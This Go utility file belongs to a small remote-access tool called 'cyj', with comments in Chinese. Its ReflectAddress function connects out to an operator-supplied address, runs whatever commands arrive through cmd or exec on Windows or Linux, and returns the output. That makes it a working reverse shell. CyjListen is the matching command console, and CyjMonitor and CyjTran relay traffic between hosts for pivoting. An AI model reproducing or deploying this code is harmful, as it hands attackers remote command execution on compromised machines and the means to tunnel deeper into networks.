package utils

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// 输出err
//func CheckErr(err error)  {
//	if err != nil{
//		log.Fatalln(err)
//	}
//}

// 欢迎
func PrintWelcome() {
	fmt.Println("+-----------------------------------------------------------+")
	fmt.Println("| Welcome to use cyj v0.0.1.                                |")
	fmt.Println("| Code by caihy05 at 2019-9-21 11:11:11.                    |")
	fmt.Println("+-----------------------------------------------------------+")
	fmt.Println()
	time.Sleep(time.Second)
}

// 检查端口
func CheckPort(port string) error {
	portNum, err := strconv.Atoi(port)
	if err != nil {
		log.Fatalln("[error]", "port should be a number")
		return err
	}
	if portNum < 20000 || portNum > 60000 {
		log.Fatalln("[error]", "port should be a number and the range is [20000,60000]")
		errMsg := errors.New("port should be a number and the range is [20000,60000]")
		return errMsg
	}
	//if err := CheckPortAlreadyUsed(port);err != nil{
	//	return err
	//}
	return nil
}

func CheckIp(address string) error {
	//fmt.Println(address)
	ipAndPort := strings.Split(address, ":")
	if len(ipAndPort) != 2 {
		log.Fatalln("[error]", "address error. should be a string like [ip:port]. ")
	}
	ip := ipAndPort[0]
	port := ipAndPort[1]
	if err := CheckPort(port); err != nil {
		os.Exit(0)
	}
	pattern := `^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$`
	ok, err := regexp.MatchString(pattern, ip)
	if err != nil || !ok {
		log.Fatalln("[error]", "ip error. ")
	}
	return nil
}
func ReflectAddress(address string) error {
	target, err := net.Dial("tcp", address)
	var buffer = make([]byte, 100000)
	defer target.Close()
	if err != nil {
		log.Println("[error]", "accept connect ["+target.RemoteAddr().String()+"] failed.", err.Error())
		return err
	}
	for {
		n, err := target.Read(buffer)
		if err != nil {
			log.Println("[error]", "Read data failed")
			return err
		}
		ml := string(buffer[:n])
		mlStr := strings.TrimSpace(ml)
		if mlStr == "" {
			mlStr = "调皮，没有输入命令"
		}
		fmt.Println("+-----------------------------------------------------------+")
		fmt.Println("|执行命令：", mlStr)
		fmt.Println("+-----------------------------------------------------------+")
		//systemName := runtime.GOOS
		switch runtime.GOOS {
		case "windows":
			cmd := exec.Command("cmd", "/C", mlStr)
			out, _ := cmd.CombinedOutput()
			reader := transform.NewReader(bytes.NewBuffer(out), simplifiedchinese.GBK.NewDecoder())
			d, err := ioutil.ReadAll(reader)
			if err != nil {
				log.Println("ReadAll data failed")
			}
			fmt.Println(string(d))
			_, err = target.Write(d)
			if err != nil {
				log.Println("Write data failed")
			}
		case "linux":
			cmd := exec.Command(mlStr)
			out, err := cmd.CombinedOutput()
			if err != nil {
				log.Println("run exec command failed")
			}
			fmt.Println(string(out))
			_, err = target.Write(out)
			if err != nil {
				log.Println("Write data failed")
			}
		default:
			log.Println("目前只支持windows和linux")
		}

	}
	return nil
}

// 监听端口address格式，ip:port
func ListenPort(address string) (net.Listener, error) {
	log.Println("[success]", "try to start server on:["+address+"]")
	server, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalln("[error]", "listen address ["+address+"] faild.")
		return nil, err
	}
	log.Println("[success]", "already listen server at:["+address+"]")
	return server, nil
}

// 接收
func CyjAccept(l net.Listener) (net.Conn, error) {
	conn, err := l.Accept()
	if err != nil {
		log.Println("[error]", "accept connect ["+conn.RemoteAddr().String()+"] faild.", err.Error())
		return nil, err
	}
	log.Println("[success]", "accept a new client. remote address:["+conn.RemoteAddr().String()+"], local address:["+conn.LocalAddr().String()+"]")
	return conn, nil
}

func RecvConnMsg(conn net.Conn) {
	var buffer = make([]byte, 100000)
	defer conn.Close()
	for {
		n, err := conn.Read(buffer)
		if err != nil {
			log.Println("read data faild")
			return
		}
		fmt.Println(string(buffer[:n]))
	}

}

func CyjListen(port string) error {
	listen, err := ListenPort(":" + port)
	if err != nil {
		return err
	} else {
		for {
			conn, err := CyjAccept(listen)
			if err == nil {
				inputReader := bufio.NewReader(os.Stdin)
				fmt.Println("Please enter some command: ")
				input, err := inputReader.ReadString('\n')
				if err != nil {
					fmt.Printf("input read is faild")
				}
				_, err = conn.Write([]byte(input))
				if err != nil {
					log.Println("read data faild")
					return err
				}
				go RecvConnMsg(conn)
			}

		}
		return nil
	}
}

func CyjMonitor(port1, port2 string) error {
	log.Println("[info]", "start monitor ...............")
	listen1, _ := ListenPort(":" + port1)
	listen2, _ := ListenPort(":" + port2)
	log.Println("[success]", "listen port:", port1, "and", port2, "success. waiting for client...")
	for {
		conn1, err1 := CyjAccept(listen1)
		conn2, err2 := CyjAccept(listen2)
		if err1 != nil || err2 != nil {
			log.Println("[err]", "accept client faild. retry in ", 5, " seconds. ")
			time.Sleep(time.Duration(5) * time.Second)
			continue
		}
		forward(conn1, conn2)
	}
}

func CyjTran(address1, address2 string) error {
	//var buffer = make([]byte, 100000)
	//defer conn1.Close()
	//if err != nil{
	//	log.Println("[error]", "accept connect ["+target.RemoteAddr().String()+"] failed.", err.Error())
	//	return err
	//}
	//return nil
	for {
		log.Println("[+]", "try to connect host:["+address1+"] and ["+address2+"]")
		var conn1, conn2 net.Conn
		var err error
		for {
			conn1, err = net.Dial("tcp", address1)
			if err != nil {
				log.Println("[→]", "connect ["+address1+"] faild by", err)
				time.Sleep(time.Duration(5) * time.Second)
				return err
			} else {
				log.Println("[→]", "connect ["+address1+"] success.")
				break
			}
		}
		for {
			conn2, err = net.Dial("tcp", address2)
			if err != nil {
				log.Println("[→]", "connect ["+address2+"] faild by", err)
				time.Sleep(time.Duration(5) * time.Second)
				return err
			} else {
				log.Println("[→]", "connect ["+address2+"] success.")
				break
			}
		}
		forward(conn1, conn2)
	}
}

func forward(conn1, conn2 net.Conn) {
	log.Println("copy data start")
	var wg sync.WaitGroup
	wg.Add(2)
	go copyStr(conn1, conn2, &wg)
	go copyStr(conn2, conn1, &wg)
	wg.Wait()
	log.Println("copy data finish")
}

func copyStr(conn1, conn2 net.Conn, wg *sync.WaitGroup) {
	//var buffer = make([]byte, 100000)
	//defer conn1.Close()
	//defer conn2.Close()
	//n,err := conn2.Read(buffer)
	//if err != nil{
	//	log.Println("read data faild")
	//	return
	//}
	//fmt.Println(string(buffer[:n]))
	//_,err = conn2.Write(buffer[:n])
	//if err != nil{
	//	log.Println("writer data faild")
	//	return
	//}
	io.Copy(conn1, conn2)
	conn1.Close()
	wg.Done()
}

func CheckPortAlreadyUsed(port string) error {
	conn, err := net.Dial("tcp", ":"+port)
	if err == nil {
		errMsg := errors.New("the port is already used")
		log.Println(errMsg)
		log.Println(err)
		conn.Close()
		return errMsg
	} else {
		return nil
	}
}
